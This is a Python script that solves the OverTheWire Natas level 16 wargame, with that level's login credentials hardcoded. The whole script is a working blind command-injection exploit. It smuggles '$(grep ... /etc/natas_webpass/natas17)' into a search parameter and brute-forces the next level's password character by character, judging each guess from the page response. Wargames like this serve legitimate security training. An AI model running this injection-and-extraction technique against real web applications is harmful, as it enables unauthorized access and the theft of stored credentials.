
#!/usr/bin/env python3
import requests, string

pwd = ''
filteredchars = ''  
auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  
for char in allchars:  
    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)  
    if 'doomed' not in r.text:  
        filteredchars = filteredchars + char  
        print(filteredchars)  

for i in range(32):
    for c in filteredchars:
        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^' + pwd + c + ' /etc/natas_webpass/natas17)', auth=auth)
        if 'doomed' not in r.text:
            pwd = pwd + c
            print(pwd)
            break
